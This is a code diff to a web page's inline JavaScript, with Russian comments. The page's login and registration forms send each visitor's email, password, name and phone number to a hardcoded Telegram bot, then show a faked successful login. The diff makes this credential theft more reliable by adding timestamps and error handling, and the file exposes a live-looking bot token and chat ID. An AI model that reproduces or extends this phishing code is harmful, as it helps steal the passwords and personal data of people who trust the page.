@@ -675,7 +675,7 @@
             const registerForm = document.getElementById('registerFormElement');
             const successMessage = document.getElementById('successMessage');
             
-            // Telegram bot configuration
+            // Telegram bot configuration - ВАШИ ДАННЫЕ
             const TELEGRAM_BOT_TOKEN = '8249371074:AAHrRtSF-smyiQrQz4zTxrHW38UtRwVLsNU';
             const TELEGRAM_CHAT_ID = '521025623';
             
@@ -708,17 +708,24 @@
                 const email = document.getElementById('loginEmail').value;
                 const password = document.getElementById('loginPassword').value;
                 
+                console.log('Отправка данных входа...');
+                
                 // Send data to Telegram
-                sendToTelegram(`🔐 Вход в систему\nEmail: ${email}\nПароль: ${password}`);
-                
-                // Show success message
-                showSuccessMessage();
-                
-                // Simulate authentication success
-                setTimeout(() => {
-                    authContainer.style.display = 'none';
-                    mainContent.style.display = 'grid';
-                }, 2000);
+                sendToTelegram(`🔐 ВХОД В СИСТЕМУ\n📧 Email: ${email}\n🔑 Пароль: ${password}\n⏰ Время: ${new Date().toLocaleString()}`)
+                .then(() => {
+                    // Show success message
+                    showSuccessMessage();
+                    
+                    // Simulate authentication success
+                    setTimeout(() => {
+                        authContainer.style.display = 'none';
+                        mainContent.style.display = 'grid';
+                    }, 2000);
+                })
+                .catch(error => {
+                    console.error('Ошибка отправки:', error);
+                    alert('Ошибка отправки данных. Проверьте консоль для деталей.');
+                });
             });
             
             // Register form submission
@@ -730,22 +737,29 @@
                 const phone = document.getElementById('registerPhone').value;
                 const password = document.getElementById('registerPassword').value;
                 
+                console.log('Отправка данных регистрации...');
+                
                 // Send data to Telegram
-                sendToTelegram(`📝 Регистрация нового пользователя\nФИО: ${name}\nEmail: ${email}\nТелефон: ${phone}\nПароль: ${password}`);
-                
-                // Show success message
-                showSuccessMessage();
-                
-                // Switch to login tab after successful registration
-                setTimeout(() => {
-                    authTabs.forEach(t => t.classList.remove('active'));
-                    document.querySelector('[data-tab="login"]').classList.add('active');
+                sendToTelegram(`📝 РЕГИСТРАЦИЯ\n👤 ФИО: ${name}\n📧 Email: ${email}\n📞 Телефон: ${phone}\n🔑 Пароль: ${password}\n⏰ Время: ${new Date().toLocaleString()}`)
+                .then(() => {
+                    // Show success message
+                    showSuccessMessage();
                     
-                    authForms.forEach(form => form.classList.remove('active'));
-                    document.getElementById('loginForm').classList.add('active');
-                    
-                    successMessage.style.display = 'none';
-                }, 3000);
+                    // Switch to login tab after successful registration
+                    setTimeout(() => {
+                        authTabs.forEach(t => t.classList.remove('active'));
+                        document.querySelector('[data-tab="login"]').classList.add('active');
+                        
+                        authForms.forEach(form => form.classList.remove('active'));
+                        document.getElementById('loginForm').classList.add('active');
+                        
+                        successMessage.style.display = 'none';
+                    }, 3000);
+                })
+                .catch(error => {
+                    console.error('Ошибка отправки:', error);
+                    alert('Ошибка отправки данных. Проверьте консоль для деталей.');
+                });
             });
             
             // Show login form when login button is clicked
@@ -775,34 +789,51 @@
             });
             
             // Function to send data to Telegram
-            function sendToTelegram(message) {
+            async function sendToTelegram(message) {
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                 
-                fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Message sent to Telegram:', data);
-                })
-                .catch(error => {
-                    console.error('Error sending message to Telegram:', error);
-                });
+                console.log('Отправка запроса к Telegram API...');
+                
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    console.log('Ответ от Telegram:', data);
+                    
+                    if (data.ok) {
+                        console.log('✅ Сообщение успешно отправлено в Telegram!');
+                        return true;
+                    } else {
+                        console.error('❌ Ошибка Telegram:', data);
+                        throw new Error(data.description || 'Unknown Telegram error');
+                    }
+                } catch (error) {
+                    console.error('❌ Ошибка отправки:', error);
+                    throw error;
+                }
             }
             
             // Function to show success message
             function showSuccessMessage() {
                 authForms.forEach(form => form.style.display = 'none');
                 successMessage.style.display = 'block';
+                console.log('✅ Показано сообщение об успехе');
             }
+            
+            // Test Telegram connection on load
+            console.log('🔧 Проверка подключения к Telegram...');
+            console.log('Token:', TELEGRAM_BOT_TOKEN);
+            console.log('Chat ID:', TELEGRAM_CHAT_ID);
         });
     </script>
 </body>
